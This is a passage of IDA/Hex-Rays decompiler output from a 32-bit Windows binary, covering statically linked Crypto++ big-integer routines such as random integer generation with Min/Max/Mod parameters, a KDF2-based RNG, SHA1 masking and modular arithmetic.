  }
  else
  {
    v8 = a3;
    if ( a3 )
    {
      v9 = a3 - 1;
      do
      {
        if ( v9 >> 2 >= this[3] )
          LOBYTE(v10) = 0;
        else
          v10 = *(_DWORD *)(this[4] + 4 * (v9 >> 2)) >> (8 * (v9 & 3));
        LOBYTE(a3) = v10;
        (*(void (__thiscall **)(int, unsigned int *, int, _DWORD, int))(*(_DWORD *)a2 + 24))(a2, &a3, 1, 0, 1);
        --v9;
        --v8;
      }
      while ( v8 );
    }
  }
}
// 441AE0: using guessed type _DWORD var_24[6];

//----- (00441BE0) --------------------------------------------------------
void __thiscall sub_441BE0(_DWORD *this, int a2, unsigned int a3, int a4)
{
  int v5[6]; // [esp+8h] [ebp-30h] BYREF
  __int64 v6; // [esp+20h] [ebp-18h]
  int v7; // [esp+34h] [ebp-4h]

  sub_435E90(v5, 0);
  v5[3] = a2;
  v5[0] = (int)&CryptoPP::ArraySink::`vftable';
  v5[1] = (int)&CryptoPP::ArraySink::`vftable';
  v5[4] = a3;
  v6 = 0i64;
  v7 = 0;
  sub_441AE0(this, (int)v5, a3, a4);
}
// 4B8EB4: using guessed type void *CryptoPP::ArraySink::`vftable';
// 4B8F6C: using guessed type void *CryptoPP::ArraySink::`vftable';

//----- (00441C70) --------------------------------------------------------
bool __stdcall sub_441C70(_DWORD *a1, int a2)
{
  int v2; // edx

  v2 = *(_DWORD *)(a2 + 20);
  if ( a1[5] == 1 )
  {
    if ( v2 != 1 )
      return 0;
  }
  else if ( v2 == 1 )
  {
    return 0;
  }
  return sub_443E50(a1, a2) == 0;
}

//----- (00441CD0) --------------------------------------------------------
int __cdecl sub_441CD0(int a1, int a2)
{
  int result; // eax
  _DWORD *v3; // ecx

  result = a2;
  if ( a2 )
  {
    v3 = (_DWORD *)(a1 + 4 * a2 - 4);
    do
    {
      if ( *(v3 - 1) )
        break;
      if ( *v3 )
        break;
      v3 -= 2;
      result -= 2;
    }
    while ( result );
  }
  return result;
}

//----- (00441D00) --------------------------------------------------------
_DWORD *__cdecl sub_441D00(_DWORD *a1, int a2)
{
  _DWORD *v2; // eax
  int v4[3]; // [esp+4h] [ebp-48h] BYREF
  int v5[6]; // [esp+10h] [ebp-3Ch] BYREF
  int v6[6]; // [esp+28h] [ebp-24h] BYREF
  int v7; // [esp+48h] [ebp-4h]

  v4[1] = (int)&CryptoPP::AbstractRing<CryptoPP::Integer>::MultiplicativeGroupT::`vftable';
  v4[2] = (int)v4;
  sub_43D6C0(v5);
  v7 = 0;
  v4[0] = (int)&CryptoPP::EuclideanDomainOf<CryptoPP::Integer>::`vftable';
  sub_43D6C0(v6);
  v7 = 1;
  v2 = (_DWORD *)(*(int (__thiscall **)(int *, int))(v4[0] + 100))(v4, a2);
  sub_43D420(a1, v2);
  sub_43DB10(v4);
  return a1;
}
// 4BA46C: using guessed type void *CryptoPP::AbstractRing<CryptoPP::Integer>::MultiplicativeGroupT::`vftable';
// 4BAEF4: using guessed type void *CryptoPP::EuclideanDomainOf<CryptoPP::Integer>::`vftable';
// 441D00: using guessed type int var_3C[6];
// 441D00: using guessed type int var_24[6];

//----- (00441D90) --------------------------------------------------------
_BYTE *__userpurge sub_441D90@<eax>(_DWORD *a1@<ecx>, int a2@<ebp>, int a3, int a4)
{
  int v4; // esi
  int v5; // edi
  unsigned int v6; // ecx
  unsigned int v7; // ecx
  _BYTE *result; // eax
  _DWORD v9[4]; // [esp-D8h] [ebp-E4h] BYREF
  _BYTE v10[72]; // [esp-C8h] [ebp-D4h] BYREF
  unsigned int v11; // [esp-80h] [ebp-8Ch]
  unsigned int v12; // [esp-7Ch] [ebp-88h]
  _BYTE *v13; // [esp-78h] [ebp-84h]
  _DWORD v14[16]; // [esp-70h] [ebp-7Ch] BYREF
  char v15; // [esp-2Fh] [ebp-3Bh]
  unsigned int v16; // [esp-28h] [ebp-34h]
  unsigned int v17; // [esp-24h] [ebp-30h]
  _DWORD *v18; // [esp-20h] [ebp-2Ch]
  int *v19; // [esp-10h] [ebp-1Ch]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-18h]
  void *v21; // [esp-8h] [ebp-14h]
  int v22; // [esp-4h] [ebp-10h]
  int v23; // [esp+0h] [ebp-Ch]
  int v24; // [esp+4h] [ebp-8h]
  int v25; // [esp+8h] [ebp-4h] BYREF
  int retaddr; // [esp+Ch] [ebp+0h]

  v23 = a2;
  v24 = retaddr;
  v22 = -1;
  v21 = &loc_4B40AE;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  v19 = &v25;
  *(_DWORD *)a1[5] = _byteswap_ulong(a1[1]++);
  v4 = a1[4];
  v5 = a1[5];
  sub_435E90(v9, 1);
  v9[1] = 0;
  v9[2] = 0;
  v11 = 0x3FFFFFFF;
  v12 = 16;
  v10[65] = 1;
  v13 = v10;
  v22 = 1;
  v16 = 0x3FFFFFFF;
  v17 = 16;
  v15 = 1;
  v18 = v14;
  sub_45C280(v14);
  v9[0] = &CryptoPP::SHA1::`vftable';
  v22 = 2;
  sub_435450((int)v9, a3, a4, v5, v4, 0, 0, 0, 1u);
  v6 = v17;
  if ( v16 < v17 )
    v6 = v16;
  if ( v18 == v14 )
    memset(v18, 0, 4 * v6);
  v7 = v12;
  result = v10;
  if ( v11 < v12 )
    v7 = v11;
  if ( v13 == v10 )
  {
    result = 0;
    memset(v13, 0, 4 * v7);
  }
  return result;
}
// 441D90: could not find valid save-restore pair for ebp
// 4BAA04: using guessed type void *CryptoPP::SHA1::`vftable';

//----- (00441EE0) --------------------------------------------------------
char __thiscall sub_441EE0(_DWORD *this, int *a2, int *a3)
{
  unsigned int v3; // edi
  int v4; // eax
  unsigned __int8 (__thiscall *v5)(int *, const char *, void *, int *); // eax
  _DWORD *v6; // eax
  int v7; // eax
  char v8; // al
  void *v9; // ecx
  int *v10; // esi
  int v11; // eax
  unsigned __int8 (__thiscall *v12)(int *, const char *, void *, int *); // eax
  char *v13; // eax
  unsigned int v14; // ecx
  unsigned int v15; // esi
  unsigned int v16; // eax
  int v17; // ecx
  __int64 v18; // rax
  int *v19; // eax
  size_t v20; // eax
  bool v21; // zf
  size_t v22; // eax
  char *v23; // eax
  int *v24; // eax
  unsigned __int8 (__thiscall ***v25)(_DWORD, _DWORD *); // ebx
  int v26; // eax
  unsigned int v27; // edx
  void *v28; // ebx
  unsigned int v29; // eax
  _DWORD *v30; // eax
  int v31; // edi
  void *v32; // ebx
  unsigned int v33; // eax
  _DWORD *v34; // ecx
  int v35; // ecx
  int *v36; // eax
  unsigned int v37; // edx
  unsigned int v38; // edx
  unsigned int v39; // edx
  void *v40; // ebx
  _DWORD *v41; // ecx
  _DWORD *v42; // ecx
  _DWORD *v43; // eax
  _DWORD *v45; // eax
  _DWORD *v46; // eax
  _DWORD *v47; // ebx
  void *v48; // [esp-10h] [ebp-150h]
  size_t v49; // [esp-4h] [ebp-144h]
  const char *v50; // [esp+20h] [ebp-120h] BYREF
  void *v51; // [esp+24h] [ebp-11Ch]
  int *v52; // [esp+28h] [ebp-118h]
  unsigned int v53; // [esp+2Ch] [ebp-114h]
  void *v54; // [esp+30h] [ebp-110h]
  int v55; // [esp+34h] [ebp-10Ch]
  int v56[3]; // [esp+38h] [ebp-108h] BYREF
  const char *v57; // [esp+44h] [ebp-FCh]
  void *v58; // [esp+48h] [ebp-F8h]
  int *v59; // [esp+4Ch] [ebp-F4h]
  _DWORD v60[6]; // [esp+60h] [ebp-E0h] BYREF
  unsigned int v61; // [esp+78h] [ebp-C8h]
  unsigned __int8 (__thiscall ***v62)(_DWORD, _DWORD *); // [esp+7Ch] [ebp-C4h] BYREF
  int *v63; // [esp+80h] [ebp-C0h]
  _DWORD v64[6]; // [esp+84h] [ebp-BCh] BYREF
  int v65; // [esp+9Ch] [ebp-A4h] BYREF
  int v66; // [esp+A0h] [ebp-A0h]
  unsigned int v67; // [esp+A4h] [ebp-9Ch]
  int v68; // [esp+ACh] [ebp-94h]
  unsigned int v69; // [esp+B0h] [ebp-90h]
  int v70; // [esp+B4h] [ebp-8Ch]
  _DWORD v71[6]; // [esp+B8h] [ebp-88h] BYREF
  unsigned int v72; // [esp+D0h] [ebp-70h]
  _DWORD v73[2]; // [esp+D4h] [ebp-6Ch] BYREF
  unsigned int v74; // [esp+DCh] [ebp-64h]
  unsigned int v75; // [esp+E0h] [ebp-60h]
  void *Block; // [esp+E4h] [ebp-5Ch]
  int v77; // [esp+E8h] [ebp-58h]
  void **v78; // [esp+ECh] [ebp-54h] BYREF
  unsigned int v79; // [esp+F4h] [ebp-4Ch] BYREF
  unsigned int v80; // [esp+F8h] [ebp-48h]
  size_t Size; // [esp+FCh] [ebp-44h]
  void *Src; // [esp+100h] [ebp-40h]
  unsigned int v83; // [esp+104h] [ebp-3Ch]
  int v84[4]; // [esp+108h] [ebp-38h] BYREF
  _DWORD *v85; // [esp+118h] [ebp-28h]
  int v86; // [esp+11Ch] [ebp-24h]
  void *v87; // [esp+120h] [ebp-20h]
  int *v88; // [esp+124h] [ebp-1Ch]
  unsigned __int8 (__thiscall ***i)(_DWORD, _DWORD *); // [esp+128h] [ebp-18h] BYREF
  _DWORD *v90; // [esp+12Ch] [ebp-14h]
  char v91[4]; // [esp+130h] [ebp-10h] BYREF
  int v92; // [esp+13Ch] [ebp-4h]
  int v93[4]; // [esp+140h] [ebp+0h] BYREF
  _DWORD v94[6]; // [esp+150h] [ebp+10h] BYREF
  int v95[2]; // [esp+168h] [ebp+28h] BYREF
  char pExceptionObject[16]; // [esp+170h] [ebp+30h] BYREF
  _DWORD v97[6]; // [esp+180h] [ebp+40h] BYREF
  _DWORD v98[2]; // [esp+198h] [ebp+58h] BYREF
  unsigned int v99; // [esp+1A0h] [ebp+60h]
  unsigned int v100; // [esp+1A4h] [ebp+64h]
  void *v101; // [esp+1A8h] [ebp+68h]
  int v102; // [esp+1ACh] [ebp+6Ch]
  char v103; // [esp+1B0h] [ebp+70h]
  char v104[3]; // [esp+1B1h] [ebp+71h] BYREF
  int v105; // [esp+1B4h] [ebp+74h] BYREF

  v90 = this;
  v3 = 0;
  v88 = a2;
  v83 = 0;
  v72 = 0;
  sub_43D420(v56, &dword_4EEE04);
  sub_4396B0(a3, v64, (int)"Min", v56[0], v56[1], v56[2], (unsigned int)v57, v58, (int)v59);
  v92 = 0;
  if ( !byte_4EEDFC )
  {
    sub_44D8F0();
    byte_4EEDFC = 1;
  }
  v84[0] = (int)&CryptoPP::Integer::`vftable';
  v84[2] = 0x3FFFFFFF;
  v84[3] = 2;
  v85 = (_DWORD *)sub_41E7A0(2u, 0);
  v86 = 0;
  v85[1] = 0;
  *v85 = 0;
  v4 = *a3;
  v59 = v84;
  v58 = &CryptoPP::Integer `RTTI Type Descriptor';
  v57 = "Max";
  v5 = *(unsigned __int8 (__thiscall **)(int *, const char *, void *, int *))(v4 + 4);
  LOBYTE(v92) = 1;
  if ( !v5(a3, "Max", &CryptoPP::Integer `RTTI Type Descriptor', v84) )
  {
    if ( !(*(unsigned __int8 (__thiscall **)(int *, const char *, int *, unsigned __int8 (__thiscall ****)(_DWORD, _DWORD *)))(*a3 + 4))(
            a3,
            "BitLength",
            &int `RTTI Type Descriptor',
            &i) )
    {
      sub_419B80((int)v98, "Integer: missing Max argument");
      LOBYTE(v92) = 3;
      sub_405230((char *)v93, v98);
      _CxxThrowException(v93, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
    }
    v6 = (_DWORD *)sub_4443D0((int)v98, (unsigned int)i);
    LOBYTE(v92) = 2;
    sub_43DBB0(v84, v6);
    LOBYTE(v92) = 1;
    sub_4066A0((int)v98);
  }
  if ( v64[5] != 1 )
  {
    if ( v86 == 1 )
      goto LABEL_102;
    v7 = sub_443E50(v64, (int)v84);
LABEL_11:
    if ( v7 <= 0 )
      goto LABEL_12;
LABEL_102:
    sub_419B80((int)v98, "Integer: Min must be no greater than Max");
    LOBYTE(v92) = 4;
    sub_405230((char *)v93, v98);
    _CxxThrowException(v93, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  if ( v86 == 1 )
  {
    v7 = -sub_443E50(v64, (int)v84);
    goto LABEL_11;
  }
LABEL_12:
  sub_43D420(&v50, &dword_4EEE04);
  sub_4396B0(a3, v60, (int)"EquivalentTo", (int)v50, (int)v51, (unsigned int)v52, v53, v54, v55);
  LOBYTE(v92) = 5;
  sub_43D420(&v50, &dword_4EEE1C);
  sub_4396B0(a3, v71, (int)"Mod", (int)v50, (int)v51, (unsigned int)v52, v53, v54, v55);
  LOBYTE(v92) = 6;
  if ( v60[5] == 1 || sub_43E230(v60, (int)v71) )
  {
    sub_419B80((int)v94, "Integer: invalid EquivalentTo and/or Mod argument");
    LOBYTE(v92) = 7;
    sub_405230(pExceptionObject, v94);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  v8 = (*(int (__thiscall **)(int *, const char *, void *, unsigned __int8 (__thiscall ****)(_DWORD, _DWORD *)))(*a3 + 4))(
         a3,
         "RandomNumberType",
         &enum CryptoPP::Integer::RandomNumberType `RTTI Type Descriptor',
         &i);
  v9 = 0;
  if ( v8 )
    v9 = i;
  v10 = 0;
  v87 = v9;
  v63 = 0;
  v68 = -1;
  v69 = 0;
  v70 = 0;
  v66 = 0;
  v67 = 0;
  LOBYTE(v65) = 0;
  v11 = *a3;
  v52 = &v65;
  v51 = &CryptoPP::ConstByteArrayParameter `RTTI Type Descriptor';
  v50 = "Seed";
  v12 = *(unsigned __int8 (__thiscall **)(int *, const char *, void *, int *))(v11 + 4);
  LOBYTE(v92) = 13;
  if ( v12(a3, "Seed", &CryptoPP::ConstByteArrayParameter `RTTI Type Descriptor', &v65) )
  {
    sub_45F0D0((int)v93, 0);
    LOBYTE(v92) = 14;
    sub_432BF0(v95, (int)v93, 48);
    v95[0] = (int)&CryptoPP::DERSequenceEncoder::`vftable';
    v95[1] = (int)&CryptoPP::DERSequenceEncoder::`vftable';
    LOBYTE(v92) = 15;
    sub_441030(v64, (int)v95);
    sub_441030(v84, (int)v95);
    sub_441030(v60, (int)v95);
    sub_441030(v71, (int)v95);
    v104[0] = HIBYTE(v87);
    v104[1] = BYTE2(v87);
    v104[2] = BYTE1(v87);
    v13 = v104;
    LOBYTE(v105) = (_BYTE)v87;
    v14 = 4;
    v103 = 0;
    do
    {
      if ( *v13 )
        break;
      --v14;
      ++v13;
    }
    while ( v14 > 1 );
    v91[0] = 2;
    v15 = v14 + 1;
    if ( ((char *)&v105 - v14)[1] >= 0 )
      v15 = v14;
    (*(void (__thiscall **)(int *, char *, int, _DWORD, int))(v95[0] + 24))(v95, v91, 1, 0, 1);
    sub_433FC0(v95, v15);
    (*(void (__thiscall **)(int *, char *, unsigned int, _DWORD, int))(v95[0] + 24))(
      v95,
      (char *)&v105 - v15 + 1,
      v15,
      0,
      1);
    if ( (_BYTE)v65 )
    {
      v16 = v69;
      v17 = v70;
    }
    else
    {
      v16 = v67;
      v17 = v66;
    }
    sub_433F30(v95, v17, v16);
    sub_434250((int)v95);
    v18 = sub_45F890(v93);
    v105 = HIDWORD(v18);
    sub_419060(&v79, v18);
    LOBYTE(v92) = 16;
    sub_45F9E0(v93, (int)Src, Size);
    v19 = (int *)operator new(0x18u);
    v10 = v19;
    v105 = (int)v19;
    LOBYTE(v92) = 17;
    if ( v19 )
    {
      sub_435E90(v19, 1);
      v20 = Size;
      *v10 = (int)&CryptoPP::KDF2_RNG::`vftable';
      v21 = v20 == -4;
      v22 = v20 + 4;
      v10[1] = 0;
      v10[3] = -1;
      v10[4] = v22;
      if ( v21 )
        v23 = 0;
      else
        v23 = (char *)sub_45AEA0(v22);
      v49 = Size;
      v10[5] = (int)v23;
      memmove(v23 + 4, Src, v49);
    }
    else
    {
      v10 = 0;
    }
    v63 = v10;
    sub_419010(&v79);
    sub_432CF0((int)v95);
    LOBYTE(v92) = 13;
    boost::exception::~exception((boost::exception *)v93);
  }
  v24 = v10;
  if ( !v10 )
    v24 = v88;
  v88 = v24;
  if ( v87 )
  {
    if ( v87 != (void *)1 )
    {
      sub_419B80((int)v98, "Integer: invalid RandomNumberType argument");
      LOBYTE(v92) = 35;
      sub_405230((char *)v93, v98);
      _CxxThrowException(v93, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
    }
    v25 = 0;
    if ( (*(unsigned __int8 (__thiscall **)(int *, const char *, const struct CryptoPP::PrimeSelector **, unsigned __int8 (__thiscall ****)(_DWORD, _DWORD *)))(*a3 + 4))(
           a3,
           "PointerToPrimeSelector",
           &CryptoPP::PrimeSelector const * `RTTI Type Descriptor',
           &v62) )
    {
      v25 = v62;
    }
    v26 = 0;
    for ( i = v25; ; v25 = i )
    {
      v105 = v26 + 1;
      if ( v26 == 15 )
      {
        sub_43D420(v73, v64);
        LOBYTE(v92) = 26;
        if ( !sub_4637D0(v73, v84, v60, v71, v25) )
        {
          v42 = v73;
          goto LABEL_92;
        }
        sub_43DBB0(v90, v73);
        if ( !sub_4637D0(v73, v84, v60, v71, v25) )
        {
          v41 = v73;
          goto LABEL_96;
        }
        v27 = v75;
        v28 = Block;
        if ( v74 < v75 )
          v27 = v74;
        LOBYTE(v92) = 27;
        memset(Block, 0, 4 * v27);
        if ( v27 )
          j_j_unknown_libname_61(v28);
        else
          j_j___free_base(v28);
        v3 = v83;
        LOBYTE(v92) = 13;
      }
      sub_4444A0(v90, v88, v64, (int)v84);
      v29 = sub_4658D0(v84);
      sub_43D500(v98, v29);
      LOBYTE(v92) = 29;
      if ( !byte_4EEDFC )
      {
        sub_44D8F0();
        byte_4EEDFC = 1;
      }
      v78 = &CryptoPP::Integer::`vftable';
      v79 = 0x3FFFFFFF;
      v80 = 2;
      v30 = (_DWORD *)sub_41E7A0(2u, 0);
      Size = (size_t)v30;
      v31 = v3 | 8;
      Src = 0;
      v72 = v31;
      v30[1] = 0;
      *v30 = 0;
      sub_444070((int)&v78, (int)v71, (int)v98);
      v32 = (void *)Size;
      v33 = v80;
      v61 = v80;
      if ( (v71[5] != 1) != (v102 != 1) )
      {
        if ( Src == (void *)1 || *(_DWORD *)Size )
          goto LABEL_59;
        if ( v80 )
        {
          v34 = (_DWORD *)(Size + 4 * (v80 - 1));
          while ( !*v34 )
          {
            --v34;
            if ( !--v33 )
              goto LABEL_60;
          }
          if ( v33 )
LABEL_59:
            Src = (void *)(1 - (_DWORD)Src);
        }
      }
LABEL_60:
      v92 = 30;
      sub_443C50(v90, v73, (int)&v78);
      v83 = v31 & 0xFFFFFFE3 | 0x14;
      v72 = v83;
      LOBYTE(v92) = 31;
      if ( v86 == 1 )
      {
        if ( v77 == 1 )
          v35 = -sub_443E50(v84, (int)v73);
        else
          v35 = -1;
      }
      else if ( v77 == 1 )
      {
        v35 = 1;
      }
      else
      {
        v35 = sub_443E50(v84, (int)v73);
      }
      v36 = v84;
      if ( v35 >= 0 )
        v36 = v73;
      v91[0] = sub_4637D0(v90, v36, v60, v71, i);
      v37 = v75;
      if ( v74 < v75 )
        v37 = v74;
      v87 = Block;
      v48 = Block;
      LOBYTE(v92) = 32;
      memset(Block, 0, 4 * v37);
      if ( v37 )
        j_j_unknown_libname_61(v48);
      else
        j_j___free_base(v48);
      v38 = v61;
      LOBYTE(v92) = 33;
      if ( v79 < v61 )
        v38 = v79;
      memset(v32, 0, 4 * v38);
      if ( v38 )
        j_j_unknown_libname_61(v32);
      else
        j_j___free_base(v32);
      v39 = v100;
      v40 = v101;
      if ( v99 < v100 )
        v39 = v99;
      LOBYTE(v92) = 34;
      memset(v101, 0, 4 * v39);
      if ( v39 )
        j_j_unknown_libname_61(v40);
      else
        j_j___free_base(v40);
      LOBYTE(v92) = 13;
      if ( v91[0] )
        goto LABEL_97;
      v3 = v83;
      v26 = v105;
    }
  }
  if ( sub_43DD20(v71, (int)&dword_4EEE1C) )
  {
    sub_4444A0(v90, v88, v64, (int)v84);
LABEL_97:
    sub_4071C0(&v65);
    if ( v10 )
      (*(void (__thiscall **)(int *, int))*v10)(v10, 1);
    sub_4066A0((int)v71);
    sub_4066A0((int)v60);
    sub_4066A0((int)v84);
    sub_4066A0((int)v64);
    return 1;
  }
  v43 = sub_43DF90(&v78, (int)v60, (int)v64);
  LOBYTE(v92) = 19;
  sub_4432F0(v43, v73, v71);
  LOBYTE(v92) = 20;
  sub_443C50(v64, v98, (int)v73);
  sub_4066A0((int)v73);
  LOBYTE(v92) = 23;
  sub_4066A0((int)&v78);
  if ( !(unsigned __int8)sub_43E190(v84, (int)v98) )
  {
    v45 = sub_43DF90(v94, (int)v84, (int)v98);
    LOBYTE(v92) = 24;
    v46 = sub_43E090(v97, v45, v71);
    v47 = v90;
    LOBYTE(v92) = 25;
    sub_4444A0(v90, v88, &dword_4EEE04, (int)v46);
    sub_4066A0((int)v97);
    LOBYTE(v92) = 23;
    sub_4066A0((int)v94);
    sub_43E280(v47, (int)v71);
    sub_43E3C0((int)v47, (int)v98);
    v41 = v98;
LABEL_96:
    sub_4066A0((int)v41);
    goto LABEL_97;
  }
  v42 = v98;
LABEL_92:
  sub_4066A0((int)v42);
  sub_4071C0(&v65);
  if ( v10 )
    (*(void (__thiscall **)(int *, int))*v10)(v10, 1);
  sub_4066A0((int)v71);
  sub_4066A0((int)v60);
  sub_4066A0((int)v84);
  sub_4066A0((int)v64);
  return 0;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 45F280: using guessed type void __thiscall boost::exception::~exception(boost::exception *__hidden this);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4B8C90: using guessed type void *CryptoPP::DERSequenceEncoder::`vftable';
// 4B8D48: using guessed type void *CryptoPP::DERSequenceEncoder::`vftable';
// 4BAD30: using guessed type void *CryptoPP::Integer::`vftable';
// 4BAE34: using guessed type void *CryptoPP::KDF2_RNG::`vftable';
// 4E9918: using guessed type const struct CryptoPP::PrimeSelector *CryptoPP::PrimeSelector const * `RTTI Type Descriptor';
// 4EE1D4: using guessed type int int `RTTI Type Descriptor';
// 4EEDFC: using guessed type char byte_4EEDFC;
// 4EEE04: using guessed type int dword_4EEE04;
// 4EEE1C: using guessed type int dword_4EEE1C;
// 441EE0: using guessed type _DWORD var_24[2];
// 441EE0: using guessed type int var_7C[4];
// 441EE0: using guessed type char var_8C[4];
// 441EE0: using guessed type _DWORD var_E8[2];
// 441EE0: using guessed type _DWORD var_6C[6];
// 441EE0: using guessed type _DWORD var_3C[6];

//----- (004428B0) --------------------------------------------------------
char __thiscall sub_4428B0(_DWORD *this, unsigned int a2)
{
  if ( a2 >> 5 >= this[3] )
    return 0;
  else
    return (*(_DWORD *)(this[4] + 4 * (a2 >> 5)) >> (a2 & 0x1F)) & 1;
}

//----- (004428E0) --------------------------------------------------------
int *sub_4428E0()
{
  return &dword_4EEE04;
}
// 4EEE04: using guessed type int dword_4EEE04;

//----- (004428F0) --------------------------------------------------------
int __cdecl sub_4428F0(unsigned int *a1, unsigned int a2, int a3)
{
  unsigned int v3; // ecx
  unsigned int v4; // eax
  int v5; // eax

  v3 = *a1;
  v4 = *a1 + a3;
  *a1 = v4;
  if ( v4 < v3 )
  {
    v5 = 1;
    if ( a2 <= 1 )
      return 1;
    while ( a1[v5]++ == -1 )
    {
      if ( ++v5 >= a2 )
        return 1;
    }
  }
  return 0;
}

//----- (00442930) --------------------------------------------------------
_DWORD *__thiscall sub_442930(_DWORD *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // ebx
  unsigned int v5; // edx
  void *v6; // esi
  int v8; // [esp+10h] [ebp-24h] BYREF
  unsigned int v9; // [esp+18h] [ebp-1Ch]
  unsigned int v10; // [esp+1Ch] [ebp-18h]
  void *Block; // [esp+20h] [ebp-14h]
  int v12; // [esp+30h] [ebp-4h]

  v3 = sub_43E040(a2, &v8);
  v12 = 0;
  v4 = sub_43DBB0(this + 9, v3);
  v5 = v10;
  v6 = Block;
  if ( v9 < v10 )
    v5 = v9;
  v12 = 1;
  memset(Block, 0, 4 * v5);
  if ( v5 )
    j_j_unknown_libname_61(v6);
  else
    j_j___free_base(v6);
  return v4;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);

//----- (004429C0) --------------------------------------------------------
_DWORD *__thiscall sub_4429C0(_DWORD *this, _DWORD *a2)
{
  _DWORD *v3; // ecx
  int v4; // eax
  _DWORD *i; // ecx
  void *v7; // ecx
  void *v8; // edx

  if ( a2[5] != 1 )
  {
    v3 = (_DWORD *)a2[4];
    if ( !*v3 )
    {
      v4 = a2[3];
      if ( !v4 )
        return a2;
      for ( i = &v3[v4 - 1]; !*i; --i )
      {
        if ( !--v4 )
          return a2;
      }
    }
  }
  v7 = (void *)this[7];
  v8 = (void *)this[13];
  if ( v8 != v7 )
  {
    sub_438F30(v8, 4 * this[6], v7, 4 * this[6]);
    v8 = (void *)this[13];
  }
  if ( off_4E8030((int)v8, a2[4]) )
    sub_441320((unsigned int *)(this[13] + 4 * a2[3]), this[6] - a2[3], 1);
  return this + 9;
}
// 4429F9: conditional instruction was optimized away because eax.4!=0
// 4E8030: using guessed type int (__stdcall *off_4E8030)(int, int);

//----- (00442A60) --------------------------------------------------------
_DWORD *__thiscall sub_442A60(_DWORD *this, _DWORD *a2, _DWORD *a3)
{
  _DWORD *v4; // eax
  unsigned int v5; // edx
  void *v6; // esi
  _DWORD *v8; // esi
  _DWORD *v9; // eax
  _DWORD v10[6]; // [esp+Ch] [ebp-3Ch] BYREF
  int v11; // [esp+24h] [ebp-24h] BYREF
  unsigned int v12; // [esp+2Ch] [ebp-1Ch]
  unsigned int v13; // [esp+30h] [ebp-18h]
  void *Block; // [esp+34h] [ebp-14h]
  int v15; // [esp+44h] [ebp-4h]

  if ( this[5] == 1 )
  {
    v4 = sub_4432F0(this, &v11, a3);
    v15 = 0;
    sub_442CD0((int)v4, a2, (int)a3);
    v5 = v13;
    v6 = Block;
    if ( v12 < v13 )
      v5 = v12;
    v15 = 1;
    memset(Block, 0, 4 * v5);
    if ( v5 )
      j_j_unknown_libname_61(v6);
    else
      j_j___free_base(v6);
    return a2;
  }
  else
  {
    if ( a3[5] == 1 || sub_443E50(this, (int)a3) >= 0 )
    {
      v9 = sub_4432F0(this, v10, a3);
      v8 = a2;
      v15 = 2;
      sub_442CD0((int)v9, a2, (int)a3);
      sub_4066A0((int)v10);
    }
    else
    {
      v8 = a2;
      sub_442CD0((int)this, a2, (int)a3);
    }
    return v8;
  }
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 442A60: using guessed type _DWORD var_3C[6];

//----- (00442B70) --------------------------------------------------------
int __thiscall sub_442B70(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // ebx
  _DWORD *v3; // ebp
  int v4; // esi
  _DWORD *v5; // eax
  unsigned int v6; // ecx
  _DWORD *v7; // ebp
  unsigned int v8; // edx
  _DWORD *v9; // eax
  unsigned int v10; // kr00_4
  int v11; // ebp
  int v12; // esi
  int v13; // eax
  int v14; // eax
  unsigned __int64 v16; // [esp-18h] [ebp-50h]
  char pExceptionObject[40]; // [esp+Ch] [ebp-2Ch] BYREF

  v2 = a2;
  if ( !a2 )
  {
    sub_43D290(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVDivideByZero_Integer_CryptoPP__);
  }
  v3 = (_DWORD *)this[4];
  if ( ((a2 - 1) & a2) != 0 )
  {
    v4 = this[3];
    if ( v4 )
    {
      v5 = &v3[v4 - 1];
      do
      {
        if ( *v5 )
          break;
        --v5;
        --v4;
      }
      while ( v4 );
    }
    v6 = 0;
    if ( a2 <= 5 )
    {
      v8 = 0;
      if ( v4 )
      {
        v9 = &v3[v4];
        do
        {
          v10 = *--v9;
          v8 = (__PAIR64__(v8, v10) + v6) >> 32;
          v6 += v10;
          --v4;
        }
        while ( v4 );
      }
      v6 = __PAIR64__(v8, v6) % a2;
    }
    else if ( v4 )
    {
      v7 = &v3[v4];
      do
      {
        HIDWORD(v16) = v6;
        LODWORD(v16) = *--v7;
        v6 = v16 % a2;
        --v4;
      }
      while ( v4 );
    }
  }
  else
  {
    v6 = (a2 - 1) & *v3;
  }
  if ( this[5] == 1 )
  {
    if ( v6 )
      v6 = a2 - v6;
  }
  v11 = 0;
  v12 = 1;
  if ( !v6 )
    return 0;
  while ( v6 != 1 )
  {
    v13 = v12 * (v2 / v6);
    v2 %= v6;
    v11 += v13;
    if ( !v2 )
      return 0;
    if ( v2 == 1 )
      return a2 - v11;
    v14 = v11 * (v6 / v2);
    v6 %= v2;
    v12 += v14;
    if ( !v6 )
      return 0;
  }
  return v12;
}

//----- (00442CD0) --------------------------------------------------------
_DWORD *__thiscall sub_442CD0(int this, _DWORD *a2, int a3)
{
  int v4; // edx
  unsigned int v5; // ebx
  int v6; // eax
  void *v7; // edi
  unsigned int v8; // edx
  _DWORD *v9; // eax
  _DWORD *v10; // eax
  _DWORD *v12; // eax
  int v13; // ebx
  _DWORD *v14; // eax
  _DWORD *v15; // eax
  char v16; // bl
  unsigned int v17; // [esp-4h] [ebp-68h]
  unsigned int v18; // [esp-4h] [ebp-68h]
  _DWORD v19[6]; // [esp+10h] [ebp-54h] BYREF
  _DWORD v20[6]; // [esp+28h] [ebp-3Ch] BYREF
  _DWORD v21[6]; // [esp+40h] [ebp-24h] BYREF
  int v22; // [esp+60h] [ebp-4h]
  _DWORD v23[6]; // [esp+64h] [ebp+0h] BYREF
  _DWORD v24[6]; // [esp+7Ch] [ebp+18h] BYREF
  void *v25[5]; // [esp+94h] [ebp+30h] BYREF
  void *v26; // [esp+A8h] [ebp+44h]
